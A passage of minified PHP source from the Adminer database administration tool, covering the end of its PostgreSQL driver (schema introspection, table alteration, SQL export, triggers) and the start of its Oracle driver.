tableHelp($_,$wd=false){$Ld=array("information_schema"=>"infoschema","pg_catalog"=>($wd?"view":"catalog"),);$y=$Ld[$_GET["ns"]];if($y)return"$y-".str_replace("_","-",$_).".html";}function
inheritsFrom($R){return
get_vals("SELECT relname FROM pg_class JOIN pg_inherits ON inhparent = oid WHERE inhrelid = ".$this->tableOid($R)." ORDER BY 1");}function
inheritedTables($R){return
get_vals("SELECT relname FROM pg_inherits JOIN pg_class ON inhrelid = oid WHERE inhparent = ".$this->tableOid($R)." ORDER BY 1");}function
partitionsInfo($R){$I=connection()->query("SELECT * FROM pg_partitioned_table WHERE partrelid = ".driver()->tableOid($R))->fetch_assoc();if($I){$ra=get_vals("SELECT attname FROM pg_attribute WHERE attrelid = $I[partrelid] AND attnum IN (".str_replace(" ",", ",$I["partattrs"]).")");$Ha=array('h'=>'HASH','l'=>'LIST','r'=>'RANGE');return
array("partition_by"=>$Ha[$I["partstrat"]],"partition"=>implode(", ",array_map('Adminer\idf_escape',$ra)),);}return
array();}function
tableOid($R){return"(SELECT oid FROM pg_class WHERE relnamespace = $this->nsOid AND relname = ".q($R)." AND relkind IN ('r', 'm', 'v', 'f', 'p'))";}function
indexAlgorithms(array$ig){static$H=array();if(!$H)$H=get_vals("SELECT amname FROM pg_am".(min_version(9.6)?" WHERE amtype = 'i'":"")." ORDER BY amname = 'btree' DESC, amname");return$H;}function
supportsIndex(array$S){return$S["Engine"]!="view";}function
hasCStyleEscapes(){static$Ja;if($Ja===null)$Ja=(get_val("SHOW standard_conforming_strings",0,$this->conn)=="off");return$Ja;}}function
idf_escape($t){return'"'.str_replace('"','""',$t).'"';}function
table($t){return
idf_escape($t);}function
get_databases($uc){return
get_vals("SELECT datname FROM pg_database
WHERE datallowconn = TRUE AND has_database_privilege(datname, 'CONNECT')
ORDER BY datname");}function
limit($F,$Z,$x,$re=0,$L=" "){return" $F$Z".($x?$L."LIMIT $x".($re?" OFFSET $re":""):"");}function
limit1($R,$F,$Z,$L="\n"){return(preg_match('~^INTO~',$F)?limit($F,$Z,1,0,$L):" $F".(is_view(table_status1($R))?$Z:$L."WHERE ctid = (SELECT ctid FROM ".table($R).$Z.$L."LIMIT 1)"));}function
db_collation($i,$Wa){return
get_val("SELECT datcollate FROM pg_database WHERE datname = ".q($i));}function
logged_user(){return
get_val("SELECT user");}function
tables_list(){$F="SELECT table_name, table_type FROM information_schema.tables WHERE table_schema = current_schema()";if(support("materializedview"))$F
.="
UNION ALL
SELECT matviewname, 'MATERIALIZED VIEW'
FROM pg_matviews
WHERE schemaname = current_schema()";$F
.="
ORDER BY 1";return
get_key_vals($F);}function
count_tables($ub){$H=array();foreach($ub
as$i){if(connection()->select_db($i))$H[$i]=count(tables_list());}return$H;}function
table_status($_=""){static$Pc;if($Pc===null)$Pc=get_val("SELECT 'pg_table_size'::regproc");$H=array();foreach(get_rows("SELECT
	relname AS \"Name\",
	CASE relkind WHEN 'v' THEN 'view' WHEN 'm' THEN 'materialized view' ELSE 'table' END AS \"Engine\"".($Pc?",
	pg_table_size(oid) AS \"Data_length\",
	pg_indexes_size(oid) AS \"Index_length\"":"").",
	obj_description(oid, 'pg_class') AS \"Comment\",
	".(min_version(12)?"''":"CASE WHEN relhasoids THEN 'oid' ELSE '' END")." AS \"Oid\",
	reltuples as \"Rows\",
	inhparent AS inherited,
	current_schema() AS nspname
FROM pg_class
LEFT JOIN pg_inherits ON inhrelid = oid
WHERE relkind IN ('r', 'm', 'v', 'f', 'p')
AND relnamespace = ".driver()->nsOid."
".($_!=""?"AND relname = ".q($_):"ORDER BY relname"))as$I)$H[$I["Name"]]=$I;return$H;}function
is_view($S){return
in_array($S["Engine"],array("view","materialized view"));}function
fk_support($S){return
true;}function
fields($R){$H=array();$ka=array('timestamp without time zone'=>'timestamp','timestamp with time zone'=>'timestamptz',);foreach(get_rows("SELECT
	a.attname AS field,
	format_type(a.atttypid, a.atttypmod) AS full_type,
	pg_get_expr(d.adbin, d.adrelid) AS default,
	a.attnotnull::int,
	col_description(a.attrelid, a.attnum) AS comment".(min_version(10)?",
	a.attidentity".(min_version(12)?",
	a.attgenerated":""):"")."
FROM pg_attribute a
LEFT JOIN pg_attrdef d ON a.attrelid = d.adrelid AND a.attnum = d.adnum
WHERE a.attrelid = ".driver()->tableOid($R)."
AND NOT a.attisdropped
AND a.attnum > 0
ORDER BY a.attnum")as$I){preg_match('~([^([]+)(\((.*)\))?([a-z ]+)?((\[[0-9]*])*)$~',$I["full_type"],$z);list(,$U,$Id,$I["length"],$fa,$na)=$z;$I["length"].=$na;$Na=$U.$fa;if(isset($ka[$Na])){$I["type"]=$ka[$Na];$I["full_type"]=$I["type"].$Id.$na;}else{$I["type"]=$U;$I["full_type"]=$I["type"].$Id.$fa.$na;}if(in_array($I['attidentity'],array('a','d')))$I['default']='GENERATED '.($I['attidentity']=='d'?'BY DEFAULT':'ALWAYS').' AS IDENTITY';$I["generated"]=($I["attgenerated"]=="s"?"STORED":"");$I["null"]=!$I["attnotnull"];$I["auto_increment"]=$I['attidentity']||preg_match('~^nextval\(~i',$I["default"])||preg_match('~^unique_rowid\(~',$I["default"]);$I["privileges"]=array("insert"=>1,"select"=>1,"update"=>1,"where"=>1,"order"=>1);if(preg_match('~(.+)::[^,)]+(.*)~',$I["default"],$z))$I["default"]=($z[1]=="NULL"?null:idf_unescape($z[1]).$z[2]);$H[$I["field"]]=$I;}return$H;}function
indexes($R,$h=null){$h=connection($h);$H=array();$lg=driver()->tableOid($R);$e=get_key_vals("SELECT attnum, attname FROM pg_attribute WHERE attrelid = $lg AND attnum > 0",$h);foreach(get_rows("SELECT relname, indisunique::int, indisprimary::int, indkey, indoption, (indpred IS NOT NULL)::int as indispartial, pg_am.amname as algorithm, pg_get_expr(pg_index.indpred, pg_index.indrelid, true) AS partial
FROM pg_index
JOIN pg_class ON indexrelid = oid
JOIN pg_am ON pg_am.oid = pg_class.relam
WHERE indrelid = $lg
ORDER BY indisprimary DESC, indisunique DESC",$h)as$I){$uf=$I["relname"];$H[$uf]["type"]=($I["indispartial"]?"INDEX":($I["indisprimary"]?"PRIMARY":($I["indisunique"]?"UNIQUE":"INDEX")));$H[$uf]["columns"]=array();$H[$uf]["descs"]=array();$H[$uf]["algorithm"]=$I["algorithm"];$H[$uf]["partial"]=$I["partial"];if($I["indkey"]){foreach(explode(" ",$I["indkey"])as$hd)$H[$uf]["columns"][]=$e[$hd];foreach(explode(" ",$I["indoption"])as$id)$H[$uf]["descs"][]=(intval($id)&1?'1':null);}$H[$uf]["lengths"]=array();}return$H;}function
foreign_keys($R){$H=array();foreach(get_rows("SELECT conname, condeferrable::int AS deferrable, pg_get_constraintdef(oid) AS definition
FROM pg_constraint
WHERE conrelid = ".driver()->tableOid($R)."
AND contype = 'f'::char
ORDER BY conkey, conname")as$I){if(preg_match('~FOREIGN KEY\s*\((.+)\)\s*REFERENCES (.+)\((.+)\)(.*)$~iA',$I['definition'],$z)){$I['source']=array_map('Adminer\idf_unescape',array_map('trim',explode(',',$z[1])));if(preg_match('~^(("([^"]|"")+"|[^"]+)\.)?"?("([^"]|"")+"|[^"]+)$~',$z[2],$Rd)){$I['ns']=idf_unescape($Rd[2]);$I['table']=idf_unescape($Rd[4]);}$I['target']=array_map('Adminer\idf_unescape',array_map('trim',explode(',',$z[3])));$I['on_delete']=(preg_match("~ON DELETE (".driver()->onActions.")~",$z[4],$Rd)?$Rd[1]:'NO ACTION');$I['on_update']=(preg_match("~ON UPDATE (".driver()->onActions.")~",$z[4],$Rd)?$Rd[1]:'NO ACTION');$H[$I['conname']]=$I;}}return$H;}function
view($_){return
array("select"=>trim(get_val("SELECT pg_get_viewdef(".driver()->tableOid($_).")")));}function
collations(){return
array();}function
information_schema($i){return
get_schema()=="information_schema";}function
error(){$H=h(connection()->error);if(preg_match('~^(.*\n)?([^\n]*)\n( *)\^(\n.*)?$~s',$H,$z))$H=$z[1].preg_replace('~((?:[^&]|&[^;]*;){'.strlen($z[3]).'})(.*)~','\1<b>\2</b>',$z[2]).$z[4];return
nl_br($H);}function
create_database($i,$c){return
queries("CREATE DATABASE ".idf_escape($i).($c?" ENCODING ".idf_escape($c):""));}function
drop_databases($ub){connection()->close();return
apply_queries("DROP DATABASE",$ub,'Adminer\idf_escape');}function
rename_database($_,$c){connection()->close();return
queries("ALTER DATABASE ".idf_escape(DB)." RENAME TO ".idf_escape($_));}function
auto_increment(){return"";}function
alter_table($R,$_,$m,$wc,$ab,$Sb,$c,$ta,$Se){$b=array();$mf=array();if($R!=""&&$R!=$_)$mf[]="ALTER TABLE ".table($R)." RENAME TO ".table($_);$Kf="";foreach($m
as$l){$d=idf_escape($l[0]);$X=$l[1];if(!$X)$b[]="DROP $d";else{$ah=$X[5];unset($X[5]);if($l[0]==""){if(isset($X[6]))$X[1]=($X[1]==" bigint"?" big":($X[1]==" smallint"?" small":" "))."serial";$b[]=($R!=""?"ADD ":"  ").implode($X);if(isset($X[6]))$b[]=($R!=""?"ADD":" ")." PRIMARY KEY ($X[0])";}else{if($d!=$X[0])$mf[]="ALTER TABLE ".table($_)." RENAME $d TO $X[0]";$b[]="ALTER $d TYPE$X[1]";$Lf=$R."_".idf_unescape($X[0])."_seq";$b[]="ALTER $d ".($X[3]?"SET".preg_replace('~GENERATED ALWAYS(.*) STORED~','EXPRESSION\1',$X[3]):(isset($X[6])?"SET DEFAULT nextval(".q($Lf).")":"DROP DEFAULT"));if(isset($X[6]))$Kf="CREATE SEQUENCE IF NOT EXISTS ".idf_escape($Lf)." OWNED BY ".idf_escape($R).".$X[0]";$b[]="ALTER $d ".($X[2]==" NULL"?"DROP NOT":"SET").$X[2];}if($l[0]!=""||$ah!="")$mf[]="COMMENT ON COLUMN ".table($_).".$X[0] IS ".($ah!=""?substr($ah,9):"''");}}$b=array_merge($b,$wc);if($R==""){$P="";if($Se){$Sa=(connection()->flavor=='cockroach');$P=" PARTITION BY $Se[partition_by]($Se[partition])";if($Se["partition_by"]=='HASH'){$Te=+$Se["partitions"];for($r=0;$r<$Te;$r++)$mf[]="CREATE TABLE ".idf_escape($_."_$r")." PARTITION OF ".idf_escape($_)." FOR VALUES WITH (MODULUS $Te, REMAINDER $r)";}else{$ff="MINVALUE";foreach($Se["partition_names"]as$r=>$X){$Y=$Se["partition_values"][$r];$Qe=" VALUES ".($Se["partition_by"]=='LIST'?"IN ($Y)":"FROM ($ff) TO ($Y)");if($Sa)$P
.=($r?",":" (")."\n  PARTITION ".(preg_match('~^DEFAULT$~i',$X)?$X:idf_escape($X))."$Qe";else$mf[]="CREATE TABLE ".idf_escape($_."_$X")." PARTITION OF ".idf_escape($_)." FOR$Qe";$ff=$Y;}$P
.=($Sa?"\n)":"");}}array_unshift($mf,"CREATE TABLE ".table($_)." (\n".implode(",\n",$b)."\n)$P");}elseif($b)array_unshift($mf,"ALTER TABLE ".table($R)."\n".implode(",\n",$b));if($Kf)array_unshift($mf,$Kf);if($ab!==null)$mf[]="COMMENT ON TABLE ".table($_)." IS ".q($ab);foreach($mf
as$F){if(!queries($F))return
false;}return
true;}function
alter_indexes($R,$b){$lb=array();$Gb=array();$mf=array();foreach($b
as$X){if($X[0]!="INDEX")$lb[]=($X[2]=="DROP"?"\nDROP CONSTRAINT ".idf_escape($X[1]):"\nADD".($X[1]!=""?" CONSTRAINT ".idf_escape($X[1]):"")." $X[0] ".($X[0]=="PRIMARY"?"KEY ":"")."(".implode(", ",$X[2]).")");elseif($X[2]=="DROP")$Gb[]=idf_escape($X[1]);else$mf[]="CREATE INDEX ".idf_escape($X[1]!=""?$X[1]:uniqid($R."_"))." ON ".table($R).($X[3]?" USING $X[3]":"")." (".implode(", ",$X[2]).")".($X[4]?" WHERE $X[4]":"");}if($lb)array_unshift($mf,"ALTER TABLE ".table($R).implode(",",$lb));if($Gb)array_unshift($mf,"DROP INDEX ".implode(", ",$Gb));foreach($mf
as$F){if(!queries($F))return
false;}return
true;}function
truncate_tables($T){return
queries("TRUNCATE ".implode(", ",array_map('Adminer\table',$T)));}function
drop_views($fh){return
drop_tables($fh);}function
drop_tables($T){foreach($T
as$R){$P=table_status1($R);if(!queries("DROP ".strtoupper($P["Engine"])." ".table($R)))return
false;}return
true;}function
move_tables($T,$fh,$mg){foreach(array_merge($T,$fh)as$R){$P=table_status1($R);if(!queries("ALTER ".strtoupper($P["Engine"])." ".table($R)." SET SCHEMA ".idf_escape($mg)))return
false;}return
true;}function
trigger($_,$R){if($_=="")return
array("Statement"=>"EXECUTE PROCEDURE ()");$e=array();$Z="WHERE trigger_schema = current_schema() AND event_object_table = ".q($R)." AND trigger_name = ".q($_);foreach(get_rows("SELECT * FROM information_schema.triggered_update_columns $Z")as$I)$e[]=$I["event_object_column"];$H=array();foreach(get_rows('SELECT trigger_name AS "Trigger", action_timing AS "Timing", event_manipulation AS "Event", \'FOR EACH \' || action_orientation AS "Type", action_statement AS "Statement"
FROM information_schema.triggers'."
$Z
ORDER BY event_manipulation DESC")as$I){if($e&&$I["Event"]=="UPDATE")$I["Event"].=" OF";$I["Of"]=implode(", ",$e);if($H)$I["Event"].=" OR $H[Event]";$H=$I;}return$H;}function
triggers($R){$H=array();foreach(get_rows("SELECT * FROM information_schema.triggers WHERE trigger_schema = current_schema() AND event_object_table = ".q($R))as$I){$Gg=trigger($I["trigger_name"],$R);$H[$Gg["Trigger"]]=array($Gg["Timing"],$Gg["Event"]);}return$H;}function
trigger_options(){return
array("Timing"=>array("BEFORE","AFTER"),"Event"=>array("INSERT","UPDATE","UPDATE OF","DELETE","INSERT OR UPDATE","INSERT OR UPDATE OF","DELETE OR INSERT","DELETE OR UPDATE","DELETE OR UPDATE OF","DELETE OR INSERT OR UPDATE","DELETE OR INSERT OR UPDATE OF"),"Type"=>array("FOR EACH ROW","FOR EACH STATEMENT"),);}function
routine($_,$U){$J=get_rows('SELECT routine_definition AS definition, LOWER(external_language) AS language, *
FROM information_schema.routines
WHERE routine_schema = current_schema() AND specific_name = '.q($_));$H=idx($J,0,array());$H["returns"]=array("type"=>$H["type_udt_name"]);$H["fields"]=get_rows('SELECT parameter_name AS field, data_type AS type, character_maximum_length AS length, parameter_mode AS inout
FROM information_schema.parameters
WHERE specific_schema = current_schema() AND specific_name = '.q($_).'
ORDER BY ordinal_position');return$H;}function
routines(){return
get_rows('SELECT specific_name AS "SPECIFIC_NAME", routine_type AS "ROUTINE_TYPE", routine_name AS "ROUTINE_NAME", type_udt_name AS "DTD_IDENTIFIER"
FROM information_schema.routines
WHERE routine_schema = current_schema()
ORDER BY SPECIFIC_NAME');}function
routine_languages(){return
get_vals("SELECT LOWER(lanname) FROM pg_catalog.pg_language");}function
routine_id($_,$I){$H=array();foreach($I["fields"]as$l){$Id=$l["length"];$H[]=$l["type"].($Id?"($Id)":"");}return
idf_escape($_)."(".implode(", ",$H).")";}function
last_id($G){$I=(is_object($G)?$G->fetch_row():array());return($I?$I[0]:0);}function
explain($g,$F){return$g->query("EXPLAIN $F");}function
found_rows($S,$Z){if(preg_match("~ rows=([0-9]+)~",get_val("EXPLAIN SELECT * FROM ".idf_escape($S["Name"]).($Z?" WHERE ".implode(" AND ",$Z):"")),$tf))return$tf[1];}function
types(){return
get_key_vals("SELECT oid, typname
FROM pg_type
WHERE typnamespace = ".driver()->nsOid."
AND typtype IN ('b','d','e')
AND typelem = 0");}function
type_values($s){$Vb=get_vals("SELECT enumlabel FROM pg_enum WHERE enumtypid = $s ORDER BY enumsortorder");return($Vb?"'".implode("', '",array_map('addslashes',$Vb))."'":"");}function
schemas(){return
get_vals("SELECT nspname FROM pg_namespace ORDER BY nspname");}function
get_schema(){return
get_val("SELECT current_schema()");}function
set_schema($Cf,$h=null){if(!$h)$h=connection();$H=$h->query("SET search_path TO ".idf_escape($Cf));driver()->setUserTypes(types());return$H;}function
foreign_keys_sql($R){$H="";$P=table_status1($R);$sc=foreign_keys($R);ksort($sc);foreach($sc
as$rc=>$qc)$H
.="ALTER TABLE ONLY ".idf_escape($P['nspname']).".".idf_escape($P['Name'])." ADD CONSTRAINT ".idf_escape($rc)." $qc[definition] ".($qc['deferrable']?'DEFERRABLE':'NOT DEFERRABLE').";\n";return($H?"$H\n":$H);}function
create_sql($R,$ta,$dg){$zf=array();$Mf=array();$P=table_status1($R);if(is_view($P)){$eh=view($R);return
rtrim("CREATE VIEW ".idf_escape($R)." AS $eh[select]",";");}$m=fields($R);if(count($P)<2||empty($m))return
false;$H="CREATE TABLE ".idf_escape($P['nspname']).".".idf_escape($P['Name'])." (\n    ";foreach($m
as$l){$Pe=idf_escape($l['field']).' '.$l['full_type'].default_value($l).($l['null']?"":" NOT NULL");$zf[]=$Pe;if(preg_match('~nextval\(\'([^\']+)\'\)~',$l['default'],$Td)){$Lf=$Td[1];$Xf=first(get_rows((min_version(10)?"SELECT *, cache_size AS cache_value FROM pg_sequences WHERE schemaname = current_schema() AND sequencename = ".q(idf_unescape($Lf)):"SELECT * FROM $Lf"),null,"-- "));$Mf[]=($dg=="DROP+CREATE"?"DROP SEQUENCE IF EXISTS $Lf;\n":"")."CREATE SEQUENCE $Lf INCREMENT $Xf[increment_by] MINVALUE $Xf[min_value] MAXVALUE $Xf[max_value]".($ta&&$Xf['last_value']?" START ".($Xf["last_value"]+1):"")." CACHE $Xf[cache_value];";}}if(!empty($Mf))$H=implode("\n\n",$Mf)."\n\n$H";$E="";foreach(indexes($R)as$fd=>$u){if($u['type']=='PRIMARY'){$E=$fd;$zf[]="CONSTRAINT ".idf_escape($fd)." PRIMARY KEY (".implode(', ',array_map('Adminer\idf_escape',$u['columns'])).")";}}foreach(driver()->checkConstraints($R)as$eb=>$gb)$zf[]="CONSTRAINT ".idf_escape($eb)." CHECK $gb";$H
.=implode(",\n    ",$zf)."\n)";$Qe=driver()->partitionsInfo($P['Name']);if($Qe)$H
.="\nPARTITION BY $Qe[partition_by]($Qe[partition])";$H
.="\nWITH (oids = ".($P['Oid']?'true':'false').");";if($P['Comment'])$H
.="\n\nCOMMENT ON TABLE ".idf_escape($P['nspname']).".".idf_escape($P['Name'])." IS ".q($P['Comment']).";";foreach($m
as$kc=>$l){if($l['comment'])$H
.="\n\nCOMMENT ON COLUMN ".idf_escape($P['nspname']).".".idf_escape($P['Name']).".".idf_escape($kc)." IS ".q($l['comment']).";";}foreach(get_rows("SELECT indexdef FROM pg_catalog.pg_indexes WHERE schemaname = current_schema() AND tablename = ".q($R).($E?" AND indexname != ".q($E):""),null,"-- ")as$I)$H
.="\n\n$I[indexdef];";return
rtrim($H,';');}function
truncate_sql($R){return"TRUNCATE ".table($R);}function
trigger_sql($R){$P=table_status1($R);$H="";foreach(triggers($R)as$Fg=>$Eg){$Gg=trigger($Fg,$P['Name']);$H
.="\nCREATE TRIGGER ".idf_escape($Gg['Trigger'])." $Gg[Timing] $Gg[Event] ON ".idf_escape($P["nspname"]).".".idf_escape($P['Name'])." $Gg[Type] $Gg[Statement];;\n";}return$H;}function
use_sql($tb){return"\connect ".idf_escape($tb);}function
show_variables(){return
get_rows("SHOW ALL");}function
process_list(){return
get_rows("SELECT * FROM pg_stat_activity ORDER BY ".(min_version(9.2)?"pid":"procpid"));}function
convert_field($l){}function
unconvert_field($l,$H){return$H;}function
support($jc){return
preg_match('~^(check|columns|comment|database|drop_col|dump|descidx|indexes|kill|partial_indexes|routine|scheme|sequence|sql|table|trigger|type|variables|view'.(min_version(9.3)?'|materializedview':'').(min_version(11)?'|procedure':'').(connection()->flavor=='cockroach'?'':'|processlist').')$~',$jc);}function
kill_process($X){return
queries("SELECT pg_terminate_backend(".number($X).")");}function
connection_id(){return"SELECT pg_backend_pid()";}function
max_connections(){return
get_val("SHOW max_connections");}}add_driver("oracle","Oracle (beta)");if(isset($_GET["oracle"])){define('Adminer\DRIVER',"oracle");if(extension_loaded("oci8")&&$_GET["ext"]!="pdo"){class
Db
extends
SqlDb{var$extension="oci8";var$_current_db;private$link;function
_error($Xb,$k){if(ini_bool("html_errors"))$k=html_entity_decode(strip_tags($k));$k=preg_replace('~^[^:]*: ~','',$k);$this->error=$k;}function
attach($M,$V,$D){$this->link=@oci_new_connect($V,$D,$M,"AL32UTF8");if($this->link){$this->server_info=oci_server_version($this->link);return'';}$k=oci_error();return$k["message"];}function
quote($Q){return"'".str_replace("'","''",$Q)."'";}function
select_db($tb){$this->_current_db=$tb;return
true;}function
query($F,$Mg=false){$G=oci_parse($this->link,$F);$this->error="";if(!$G){$k=oci_error($this->link);$this->errno=$k["code"];$this->error=$k["message"];return
false;}set_error_handler(array($this,'_error'));$H=@oci_execute($G);restore_error_handler();if($H){if(oci_num_fields($G))return
new
Result($G);$this->affected_rows=oci_num_rows($G);oci_free_statement($G);}return$H;}}class
Result{var$num_rows;private$result,$offset=1;function
__construct($G){$this->result=$G;}private
function
convert($I){foreach((array)$I
as$w=>$X){if(is_a($X,'OCILob')||is_a($X,'OCI-Lob'))$I[$w]=$X->load();}return$I;}function
fetch_assoc(){return$this->convert(oci_fetch_assoc($this->result));}function
fetch_row(){return$this->convert(oci_fetch_row($this->result));}function
fetch_field(){$d=$this->offset++;$H=new
\stdClass;$H->name=oci_field_name($this->result,$d);$H->type=oci_field_type($this->result,$d);$H->charsetnr=(preg_match("~raw|blob|bfile~",$H->type)?63:0);return$H;}function
__destruct(){oci_free_statement($this->result);}}}elseif(extension_loaded("pdo_oci")){class
Db
extends
PdoDb{var$extension="PDO_OCI";var$_current_db;function
attach($M,$V,$D){return$this->dsn("oci:dbname=//$M;charset=AL32UTF8",$V,$D);}function
select_db($tb){$this->_current_db=$tb;return
true;}}}class
Driver
extends
SqlDriver{static$extensions=array("OCI8","PDO_OCI");static$jush="oracle";var$insertFunctions=array("date"=>"current_date","timestamp"=>"current_timestamp",);var$editFunctions=array("number|float|double"=>"+/-","date|timestamp"=>"+ interval/- interval","char|clob"=>"||",);var$operators=array("=","<",">","<=",">=","!=","LIKE","LIKE %%","IN","IS NULL","NOT LIKE","NOT IN","IS NOT NULL","SQL");var$functions=array("length","lower","round","upper");var$grouping=array("avg","count","count distinct","max","min","sum");function
__construct(Db$g){parent::__construct($g);$this->types=array(lang(25)=>array("number"=>38,"binary_float"=>12,"binary_double"=>21),lang(26)=>array("date"=>10,"timestamp"=>29,"interval year"=>12,"interval day"=>28),lang(27)=>array("char"=>2000,"varchar2"=>4000,"nchar"=>2000,"nvarchar2"=>4000,"clob"=>4294967295,"nclob"=>4294967295),lang(28)=>array("raw"=>2000,"long raw"=>2147483648,"blob"=>4294967295,"bfile"=>4294967296),);}function
begin(){return
true;}function
insertUpdate($R,array$J,array$E){foreach($J
as$N){$Ug=array();$Z=array();foreach($N
as$w=>$X){$Ug[]="$w = $X";if(isset($E[idf_unescape($w)]))$Z[]="$w = $X";}if(!(($Z&&queries("UPDATE ".table($R)." SET ".implode(", ",$Ug)." WHERE ".implode(" AND ",$Z))&&connection()->affected_rows)||queries("INSERT INTO ".table($R)." (".implode(", ",array_keys($N)).") VALUES (".implode(", ",$N).")")))return
false;}return
true;}function
hasCStyleEscapes(){return
true;}}function
idf_escape($t){return'"'.str_replace('"','""',$t).'"';}function
table($t){return
idf_escape($t);}function
get_databases($uc){return
get_vals("SELECT DISTINCT tablespace_name FROM (
SELECT tablespace_name FROM user_tablespaces
UNION SELECT tablespace_name FROM all_tables WHERE tablespace_name IS NOT NULL
)
ORDER BY 1");}function
limit($F,$Z,$x,$re=0,$L=" "){return($re?" * FROM (SELECT t.*, rownum AS rnum FROM (SELECT $F$Z) t WHERE rownum <= ".($x+$re).") WHERE rnum > $re":($x?" * FROM (SELECT $F$Z) WHERE rownum <= ".($x+$re):" $F$Z"));}function
limit1($R,$F,$Z,$L="\n"){return" $F$Z";}function
db_collation($i,$Wa){return
get_val("SELECT value FROM nls_database_parameters WHERE parameter = 'NLS_CHARACTERSET'");}function
logged_user(){return
get_val("SELECT USER FROM DUAL");}function
get_current_db(){$i=connection()->_current_db?:DB;unset(connection()->_current_db);return$i;}function
where_owner($ef,$Ke="owner"){if(!$_GET["ns"])return'';return"$ef$Ke = sys_context('USERENV', 'CURRENT_SCHEMA')";}function
views_table($e){$Ke=where_owner('');return"(SELECT $e FROM all_views WHERE ".($Ke?:"rownum < 0").")";}function
tables_list(){$eh=views_table("view_name");$Ke=where_owner(" AND ");return
get_key_vals("SELECT table_name, 'table' FROM all_tables WHERE tablespace_name = ".q(DB)."$Ke
UNION SELECT view_name, 'view' FROM $eh
ORDER BY 1");}function
count_tables($ub){$H=array();foreach($ub
as$i)$H[$i]=get_val("SELECT COUNT(*) FROM all_tables WHERE tablespace_name = ".q($i));return$H;}function
table_status($_=""){$H=array();$Ef=q($_);$i=get_current_db();$eh=views_table("view_name");$Ke=where_owner(" AND ");foreach(get_rows('SELECT table_name "Name", \'table\' "Engine", avg_row_len * num_rows "Data_length", num_rows "Rows" FROM all_tables WHERE tablespace_name = '.q($i).$Ke.($_!=""?" AND table_name = $Ef":"")."
UNION SELECT view_name, 'view', 0, 0 FROM $eh".($_!=""?" WHERE view_name = $Ef":"")."
ORDER BY 1")as$I)$H[$I["Name"]]=$I;return$H;}function
is_view($S){return$S["Engine"]=="view";}function
fk_support($S){return
true;}function
fields($R){$H=array();$Ke=where_owner(" AND ");foreach(get_rows("SELECT * FROM all_tab_columns WHERE table_name = ".q($R)."$Ke ORDER BY column_id")as$I){$U=$I["DATA_TYPE"];$Id="$I[DATA_PRECISION],$I[DATA_SCALE]";if($Id==",")$Id=$I["CHAR_COL_DECL_LENGTH"];$H[$I["COLUMN_NAME"]]=array("field"=>$I["COLUMN_NAME"],"full_type"=>$U.($Id?"($Id)":""),"type"=>strtolower($U),"length"=>$Id,"default"=>$I["DATA_DEFAULT"],"null"=>($I["NULLABLE"]=="Y"),"privileges"=>array("insert"=>1,"select"=>1,"update"=>1,"where"=>1,"order"=>1),);}return$H;}function
indexes($R,$h=null){$H=array();$Ke=where_owner(" AND ","aic.table_owner");foreach(get_rows("SELECT aic.*, ac.constraint_type, atc.data_default
FROM all_ind_columns aic
LEFT JOIN all_constraints ac ON aic.index_name = ac.constraint_name AND aic.table_name = ac.table_name AND aic.index_owner = ac.owner
LEFT JOIN all_tab_cols atc ON aic.column_name = atc.column_name AND aic.table_name = atc.table_name AND aic.index_owner = atc.owner
WHERE aic.table_name = ".q($R)."$Ke
ORDER BY ac.constraint_type, aic.column_position",$h)as$I){$fd=$I["INDEX_NAME"];$Ya=$I["DATA_DEFAULT"];$Ya=($Ya?trim($Ya,'"'):$I["COLUMN_NAME"]);$H[$fd]["type"]=($I["CONSTRAINT_TYPE"]=="P"?"PRIMARY":($I["CONSTRAINT_TYPE"]=="U"?"UNIQUE":"INDEX"));$H[$fd]["columns"][]=$Ya;$H[$fd]["lengths"][]=($I["CHAR_LENGTH"]&&$I["CHAR_LENGTH"]!=$I["COLUMN_LENGTH"]?$I["CHAR_LENGTH"]:null);$H[$fd]["descs"][]=($I["DESCEND"]&&$I["DESCEND"]=="DESC"?'1':null);}return$H;}function
view($_){$eh=views_table("view_name, text");$J=get_rows('SELECT text "select" FROM '.$eh.' WHERE view_name = '.q($_));return
reset($J);}function
collations(){return
array();}function
information_schema($i){return
get_schema()=="INFORMATION_SCHEMA";}function
error(){return
h(connection()->error);}function
explain($g,$F){$g->query("EXPLAIN PLAN FOR $F");return$g->query("SELECT * FROM plan_table");}function
found_rows($S,$Z){}function
auto_increment(){return"";}function
alter_table($R,$_,$m,$wc,$ab,$Sb,$c,$ta,$Se){$b=$Gb=array();$Ge=($R?fields($R):array());foreach($m
as$l){$X=$l[1];if($X&&$l[0]!=""&&idf_escape($l[0])!=$X[0])queries("ALTER TABLE ".table($R)." RENAME COLUMN ".idf_escape($l[0])." TO $X[0]");$Fe=$Ge[$l[0]];if($X&&$Fe){$te=process_field($Fe,$Fe);if($X[2]==$te[2])$X[2]="";}if($X)$b[]=($R!=""?($l[0]!=""?"MODIFY (":"ADD ("):"  ").implode($X).($R!=""?")":"");else$Gb[]=idf_escape($l[0]);}if($R=="")return
queries("CREATE TABLE ".table($_)." (\n".implode(",\n",$b)."\n)");return(!$b||queries("ALTER TABLE ".table($R)."\n".implode("\n",$b)))&&(!$Gb||queries("ALTER TABLE ".table($R)." DROP (".implode(", ",$Gb).")"))&&($R==$_||queries("ALTER TABLE ".table($R)." RENAME TO ".table($_)));}function
alter_indexes($R,$b){$Gb=array();$mf=array();foreach($b
as$X){if($X[0]!="INDEX"){$X[2]=preg_replace('~ DESC$~','',$X[2]);$lb=($X[2]=="DROP"?"\nDROP CONSTRAINT ".idf_escape($X[1]):"\nADD".($X[1]!=""?" CONSTRAINT ".idf_escape($X[1]):"")." $X[0] ".($X[0]=="PRIMARY"?"KEY ":"")."(".implode(", ",$X[2]).")");array_unshift($mf,"ALTER TABLE ".table($R).$lb);}elseif($X[2]=="DROP")$Gb[]=idf_escape($X[1]);else$mf[]="CREATE INDEX ".idf_escape($X[1]!=""?$X[1]:uniqid($R."_"))." ON ".table($R)." (".implode(", ",$X[2]).")";}if($Gb)array_unshift($mf,"DROP INDEX ".implode(", ",$Gb));foreach($mf
as$F){if(!queries($F))return
false;}return
true;}function
foreign_keys($R){$H=array();$F="SELECT c_list.CONSTRAINT_NAME as NAME,
c_src.COLUMN_NAME as SRC_COLUMN,
c_dest.OWNER as DEST_DB,
c_dest.TABLE_NAME as DEST_TABLE,
c_dest.COLUMN_NAME as DEST_COLUMN,
c_list.DELETE_RULE as ON_DELETE
FROM ALL_CONSTRAINTS c_list, ALL_CONS_COLUMNS c_src, ALL_CONS_COLUMNS c_dest
WHERE c_list.CONSTRAINT_NAME = c_src.CONSTRAINT_NAME
